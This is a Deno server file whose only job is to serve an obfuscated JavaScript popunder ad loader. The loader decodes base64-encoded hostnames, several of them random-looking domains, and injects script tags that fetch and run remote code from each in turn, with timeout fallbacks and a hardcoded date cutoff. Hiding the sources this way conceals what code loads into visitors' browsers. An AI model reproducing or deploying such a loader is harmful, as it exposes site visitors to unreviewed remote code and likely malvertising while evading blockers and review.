import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

serve(async () => {
  const script = `
(function(){var x=window,h="c9b6cb59c84ff56aa7ad154505a16417",y=[["siteId",588-240-958+5259529],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],e=["d3d3LnZpc2FyaW9tZWRpYS5jb20vaG1tZW51LmNzcw==","ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvZklNWC9yZm9yY2UubWluLmpz","d3d3LmpwcWZ5dG96dG8uY29tL2ptbWVudS5jc3M=","d3d3LnViY3dhaGNrdi5jb20vWGRBL2lmb3JjZS5taW4uanM="],j=-1,o,w,p=function(){clearTimeout(w);j++;if(e[j]&&!(1795320888000<(new Date).getTime()&&1<j)){o=x.document.createElement("script");o.type="text/javascript";o.async=!0;var i=x.document.getElementsByTagName("script")[0];o.src="https://"+atob(e[j]);o.crossOrigin="anonymous";o.onerror=p;o.onload=function(){clearTimeout(w);x[h.slice(0,16)+h.slice(0,16)]||p()};w=setTimeout(p,5E3);i.parentNode.insertBefore(o,i)}};if(!x[h]){try{Object.freeze(x[h]=y)}catch(e){}p()}})();
`;

  return new Response(script, {
    headers: {
      "Content-Type": "application/javascript",
      "Cache-Control": "no-cache, no-store, must-revalidate",
    },
  });
});
